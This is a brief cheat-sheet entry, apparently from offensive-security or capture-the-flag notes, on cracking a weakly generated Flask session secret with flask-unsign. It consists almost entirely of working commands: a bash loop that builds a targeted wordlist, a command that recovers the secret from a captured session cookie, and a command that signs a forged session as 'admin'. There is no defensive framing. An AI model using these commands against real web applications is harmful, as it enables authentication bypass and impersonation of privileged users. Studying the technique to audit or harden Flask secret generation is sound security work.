# Weak Flask Session Secret Brute Force (flask-unsign)

If the secret is generated from a small/guessable space (e.g. `"prefix_" + random.randrange(100000, 999999)`), build a targeted wordlist instead of brute-forcing blind.

```bash
# generate candidates matching the known pattern
for i in $(seq 100000 999999); do echo "prefix_$i"; done > flask_wordlist.txt

flask-unsign --unsign --wordlist flask_wordlist.txt --cookie '<captured-session-cookie>'
# once the secret is found, forge any session:
flask-unsign --sign --cookie "{'logged_in': True, 'username': 'admin'}" --secret '<found-secret>'
```
